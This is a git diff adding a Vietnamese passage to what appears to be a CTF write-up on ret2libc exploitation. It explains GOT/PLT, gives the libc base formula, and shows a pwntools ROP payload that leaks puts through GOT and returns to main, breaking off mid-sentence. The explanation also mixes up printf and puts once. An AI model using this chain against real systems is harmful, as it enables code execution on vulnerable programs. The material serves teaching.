@@ -121,3 +121,17 @@ GOT (Global Offset Table)  nằm ở phân vùng `.got.plt` là bảng lưu tr�
 
 PLT (Procedure Linkage Table) nằm trong phân vùng `.text` là trạm trung chuyển để lấy địa chỉ chạy hàm trong GOT. Mỗi khi code C gọi `printf()`, thực chất nó sẽ nhảy tới `printf@plt` rồi thực thi hàm mà `puts@got` trỏ tới.
 ## Khai thác 
+Vì libc chứa các hàm quan trọng trong C, bao gồm cả hàm system và nơi chứa sẵn '/bin/sh\0'. Nhưng vì cơ chế ASLR nên tất nhiên các hàm này không nằm ở địa chỉ cố định. Để tìm được địa chỉ thực thì cần tính base address của libc qua công thức:
+
+    libc.address = leak_puts - libc.sym['puts']
+
+leak_puts là địa chỉ của hàm puts leak được từ bảng GOT. Bằng cách nhảy đến PLT của puts, ta ép chương trình in ra địa chỉ leak_puts này.
+
+    payload=b'A'*88
+    payload+=p64(pop_rdi) + p64(exe.got['puts'])  #đẩy địa chỉ thực hàm puts vào rdi
+    payload+=p64(exe.plt['puts'])                 #gọi hàm puts với tham số là địa chỉ trong rdi để leak
+    payload+=p64(exe.sym['main'])                 #chạy lại hàm main để setup gọi system
+    p.sendafter(b'something \n', payload)
+    libc_leak=u64(p.recv(6)+b'\0\0')
+
+Vì libc của local có thể khác với của server nên cần kiểm tra kí tự cuối của địa chỉ rồi truy 
